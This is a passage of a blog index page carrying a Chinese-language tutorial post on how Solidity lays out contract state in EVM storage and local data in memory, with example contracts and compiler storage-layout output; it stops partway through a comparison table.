<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"zhoubofsy.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Bolog">
<meta property="og:url" content="http://zhoubofsy.github.io/index.html">
<meta property="og:site_name" content="Bolog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="博">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://zhoubofsy.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Bolog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Bolog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/12/09/blockchain/ethereum/solidity-state-layout/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="博">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bolog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/09/blockchain/ethereum/solidity-state-layout/" class="post-title-link" itemprop="url">Solidity中的存储布局和内存布局</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-12-09 14:42:13" itemprop="dateCreated datePublished" datetime="2024-12-09T14:42:13+08:00">2024-12-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-10 13:18:06" itemprop="dateModified" datetime="2024-12-10T13:18:06+08:00">2024-12-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/blockchain/" itemprop="url" rel="index"><span itemprop="name">blockchain</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>EVM 的整个空间被逻辑上划分为不同的区域，分别为栈（Stack）、内存（Memory）、存储（Storage）、代码（Code）和常量区域。</p>
<p><strong>栈区域（Stack）区域</strong></p>
<ul>
<li>特点:<ul>
<li>栈是一个 固定大小 的数据区域，最大为 1024 个字（每个字 32 字节）。</li>
<li>用于存储操作数、临时值，以及函数调用的返回地址。</li>
<li>数据只能通过 push 和 pop 操作访问。</li>
</ul>
</li>
<li>作用: 函数内部的临时变量和操作数首先存储在栈中。</li>
</ul>
<p><strong>内存 (Memory)区域</strong></p>
<ul>
<li>功能: 用于临时存储数据，生命周期仅在交易或调用期间有效。</li>
<li>地址范围: 逻辑地址从<code>0</code>开始，可以按需扩展，理论上可以扩展到 <code>2^256 - 1</code>。</li>
<li>特点:<ul>
<li>按 32 字节（256 位）对齐。</li>
<li>初始化时为空（零值）。</li>
<li>按需分配时会增加 gas 消耗。</li>
</ul>
</li>
<li>作用: 用于存储函数的局部变量、动态数组、字符串、函数参数等。</li>
</ul>
<p><strong>数据调用区域（Calldata）</strong></p>
<ul>
<li>特点:<ul>
<li>是不可修改的只读区域，用于传递外部函数调用的输入数据。</li>
<li>效率高，Gas 消耗低。</li>
</ul>
</li>
<li>作用：效率高，Gas 消耗低。</li>
</ul>
<p><strong>存储 (Storage)区域</strong></p>
<ul>
<li>地址范围：存储区域的地址范围是从 0 到 2^256 - 1。</li>
<li>存储单元：每个存储槽（storage slot）大小为 32 字节（256 位）。</li>
<li>访问方式：存储按照 键值对的形式 存储，每个键为 256 位的存储槽地址，每个值为 256 位的存储内容。</li>
<li>作用：存储合约的全局状态。</li>
</ul>
<h1 id="Storage-Layout-存储布局"><a href="#Storage-Layout-存储布局" class="headerlink" title="Storage Layout (存储布局)"></a>Storage Layout (存储布局)</h1><p>存储状态布局涉及 合约的存储变量如何映射到 EVM 的存储空间。EVM 的存储空间是一个巨大的 256 位地址空间，采用键值对形式。每个存储槽（slot）存储 32 字节数据。</p>
<p>EVM 的存储区域采用 哈希映射结构 存储数据：</p>
<ul>
<li>简单变量：直接按照顺序存储，每个变量占用一个或部分存储槽。</li>
<li>复杂数据结构：<ul>
<li>数组：第一个槽存储长度，数据存储在 <code>keccak256(slot)</code> 地址开始的连续存储槽中。</li>
<li>映射：数据存储在 <code>keccak256(key, slot)</code> 地址处，key 是映射键，slot 是映射变量在合约中的存储槽编号。</li>
<li>结构体：将结构体的成员顺序存储，每个成员分配单独的存储槽。</li>
</ul>
</li>
</ul>
<h2 id="存储分配规则"><a href="#存储分配规则" class="headerlink" title="存储分配规则"></a>存储分配规则</h2><ol>
<li><p>基础规则</p>
<ul>
<li>变量顺序存储: 每个状态变量按声明顺序分配存储槽，优先填充当前槽剩余空间。</li>
<li>一个槽的大小为 32 字节。</li>
<li>如果变量类型大小超过槽大小（如 uint256），则占据一个完整槽。</li>
<li>较小变量（如 uint8、bool）在同一槽中紧密打包，但不能跨槽。</li>
</ul>
</li>
<li><p>映射（Mapping）</p>
<ul>
<li>映射的键值对（key-value）不会紧密打包在槽中。</li>
<li>每个键（key）对应的值（value）存储在一个唯一的槽中，其地址由<code>keccak256(key, slot)</code> 计算</li>
<li>键（key）不会存储在存储区域中，键值（key-value）对中的“键（key）”并没有单独存储的槽。所以无法直接遍历Mapping</li>
</ul>
</li>
<li><p>动态数组与字符串</p>
<ul>
<li>元数据存储：动态数组的主槽（主存储槽）中存储的是数组的长度。</li>
<li>数据存储：数组的实际数据存储在与主槽分开的连续存储槽中。<ul>
<li>数据槽的起始地址由 keccak256(slot) 计算得出，slot 是动态数组的主槽编号。</li>
<li>数组中的每个元素按照顺序依次存储在数据槽中。</li>
</ul>
</li>
<li>字符串与动态数组处理相似。</li>
</ul>
</li>
<li><p>结构体（Struct）</p>
<ul>
<li>结构体的变量按顺序存储。</li>
<li>结构体变量紧密打包（类似单个槽中存储的变量）。</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract StateLayoutExample &#123;</span><br><span class="line">    uint256 public number;         // Slot 0</span><br><span class="line">    bool public flag;              // Slot 1 (packed with `smallValue` if space allows)</span><br><span class="line">    uint16 public smallValue;      // Slot 1</span><br><span class="line">    mapping(uint256 =&gt; uint256) public map; // Data stored at keccak256(key, 2)</span><br><span class="line">    uint256[] public dynamicArray; // Slot 3: array length; data starts at keccak256(3)</span><br><span class="line">    struct MyStruct &#123;</span><br><span class="line">        uint256 largeValue;        // Slot 4</span><br><span class="line">        uint8 smallPart;           // Slot 4 (packed with other struct fields)</span><br><span class="line">    &#125;</span><br><span class="line">    MyStruct public myStruct;      // Struct occupies its own slots</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行命令 <code>solc --storage-layout --transient-storage-layout StateLayoutExample.sol</code> 查看合约存储布局 </p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;storage&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;number&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint256&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;flag&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_bool&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;smallValue&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint16&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">11</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;map&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_mapping(t_uint256,t_uint256)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">14</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;dynamicArray&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;3&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_array(t_uint256)dyn_storage&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">22</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;myStruct&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;4&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_struct(MyStruct)19_storage&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;types&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;t_array(t_uint256)dyn_storage&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;base&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint256&quot;</span><span class="punctuation">,</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;dynamic_array&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;uint256[]&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;32&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_bool&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;inplace&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;bool&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_mapping(t_uint256,t_uint256)&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;mapping&quot;</span><span class="punctuation">,</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint256&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;mapping(uint256 =&gt; uint256)&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;32&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint256&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_struct(MyStruct)19_storage&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;inplace&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;struct StateLayoutExample.MyStruct&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;members&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">16</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;largeValue&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint256&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">18</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;smallPart&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint8&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;64&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_uint16&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;inplace&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;uint16&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_uint256&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;inplace&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;uint256&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;32&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_uint8&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;inplace&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;uint8&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>storage</strong></p>
<p>描述每个状态变量的存储位置：<br>    - <code>slot</code>: 存储槽号。<br>    - <code>offset</code>: 偏移量，表示变量在槽内的起始位置。<br>    - <code>type</code>: 变量的类型标识，与 types 部分中的描述对应。</p>
<p><strong>types</strong></p>
<p>定义每种数据类型的详细信息：<br>    - <code>encoding</code>: 数据的存储方式（如 inplace 或 dynamic_array）。<br>    - <code>numberOfBytes</code>: 占用的字节数。<br>    - <code>members</code>: 如果是结构体，列出所有成员及其存储位置。<br>    - <code>base</code>: 如果是数组，表示基础类型。</p>
<h1 id="Memory-Layout-内存布局"><a href="#Memory-Layout-内存布局" class="headerlink" title="Memory Layout (内存布局)"></a>Memory Layout (内存布局)</h1><p>在 Solidity 中，内存（Memory） 是 EVM 提供的一种线性存储结构，主要用于在函数调用过程中存储临时变量、局部变量和中间计算结果。内存是按需分配的，不同于存储（Storage），内存是 瞬时的，在调用结束后会被释放，且读写成本较低。</p>
<p>内存是一个 按字节寻址的线性空间，地址范围从 0x00 到无限大（理论上为 2^256 - 1）。但在实际操作中，内存的分配是动态增长的，EVM 会根据需要分配内存，并且以 32 字节（一个字）为单位扩展。</p>
<pre><code>- 每个内存地址存储一个字节。
- 每 32 个字节组成一个字（word），这是 EVM 操作的基本单位。
</code></pre>
<p>内存布局的设计遵循以下原则：</p>
<ol>
<li>按需动态分配:<ul>
<li>Solidity 会在需要时从内存中分配新的空间。</li>
<li>起始空闲内存地址存储在 0x40，可通过 mload(0x40) 获取。</li>
</ul>
</li>
<li>按 32 字节对齐:<ul>
<li>内存分配是以 32 字节为单位对齐的，即使是 bool 等小数据类型也会占用 32 字节。</li>
</ul>
</li>
<li>变量存储位置:<ul>
<li>固定大小类型直接存储其值。</li>
<li>动态类型存储一个指针，指向实际数据的内存地址。</li>
</ul>
</li>
</ol>
<h2 id="固定分配区域"><a href="#固定分配区域" class="headerlink" title="固定分配区域"></a>固定分配区域</h2><p>Solidity保留了四个32字节的插槽，具体的字节范围（包括端点）使用如下：</p>
<ul>
<li>0x00 ~ 0x3f（64Byte）<ul>
<li>用于哈希方法的临时空间</li>
<li>临时空间可以在语句之间使用（即在内联汇编之中）。</li>
</ul>
</li>
<li>0x40 ~ 0x5f (Free memory pointer 32Byte):<ul>
<li>mstore(0x40, …) 用于指向当前空闲内存的起始地址。</li>
<li>Solidity 使用内存时，会从该地址开始分配。</li>
<li>开发者不需要手动管理，但在使用汇编时，需要注意维护 0x40 的正确值。</li>
</ul>
</li>
<li>0x60 ~ 0x7f（Zero pointer 32Byte):<ul>
<li>保留一块全零的内存区域，通常用于返回零值。</li>
<li>0值插槽则用来对动态内存数组进行初始化，且永远不会写入数据 （因而可用的初始内存指针为 0x80）。</li>
</ul>
</li>
</ul>
<p>Solidity 总会把新对象保存在空闲内存指针的位置， 所以这段内存实际上从来不会空闲（在未来可能会修改这个机制）。</p>
<h2 id="动态分配区域"><a href="#动态分配区域" class="headerlink" title="动态分配区域"></a>动态分配区域</h2><p>Solidity 的局部变量、动态数组和字符串都从 0x80 开始动态分配，并按照实际需要扩展。</p>
<p>分配规则：<br>    - 内存分配以 32 字节为单位对齐。<br>    - 临时变量直接写入内存对应的位置。<br>    - 动态类型需要额外存储元数据（如长度和起始地址）。</p>
<h2 id="内存中的数据类型布局"><a href="#内存中的数据类型布局" class="headerlink" title="内存中的数据类型布局"></a>内存中的数据类型布局</h2><h3 id="固定大小的类型"><a href="#固定大小的类型" class="headerlink" title="固定大小的类型"></a>固定大小的类型</h3><ul>
<li>包括 uint256、address、bool 等。</li>
<li>直接按 32 字节对齐存储，例如：<ul>
<li>uint256 占用 32 字节。</li>
<li>bool 也占用 32 字节（尽管实际值只需 1 字节）。</li>
</ul>
</li>
</ul>
<h3 id="动态类型"><a href="#动态类型" class="headerlink" title="动态类型"></a>动态类型</h3><p>动态类型（如 string、bytes 和动态数组）会分为两个部分：</p>
<ol>
<li>指针部分：主变量存储的是指向实际数据的偏移量（相对于起始地址 0x80 的偏移量）。</li>
<li>数据部分：存储动态类型的元数据（如长度）和实际数据。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MemoryExample &#123;</span><br><span class="line">    function demo() public pure returns (bytes memory, string memory) &#123;</span><br><span class="line">        bytes memory byteArray = new bytes(10); // 动态字节数组</span><br><span class="line">        string memory str = &quot;Hello, Memory!&quot;;</span><br><span class="line">        return (byteArray, str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>byteArray</code>:<ul>
<li>主变量存储数据偏移量，例如 0x80。</li>
<li>数据存储从 0x80 开始：<ul>
<li>长度（10 字节）：存储在 0x80。</li>
<li>实际内容（10 字节）：从 0xA0 开始。</li>
</ul>
</li>
</ul>
</li>
<li><code>str</code>:<ul>
<li>主变量存储数据偏移量，例如 0xE0。</li>
<li>数据存储从 0xE0 开始：<ul>
<li>长度（14 字节）：存储在 0xE0。</li>
<li>实际内容（”Hello, Memory!”）：从 0x100 开始。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h1 id="State-Layout-和-Memory-Layout-的区别"><a href="#State-Layout-和-Memory-Layout-的区别" class="headerlink" title="State Layout 和 Memory Layout 的区别"></a>State Layout 和 Memory Layout 的区别</h1><table>
<thead>
<tr>
<th align="center">特性</th>
<th align="left">状态布局 (State Layout)</th>
<th align="left">内存布局 (Memory Layout)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">存储位置</td>
<td align="left">持久化存储在 EVM 存储 (Storage) 中</td>
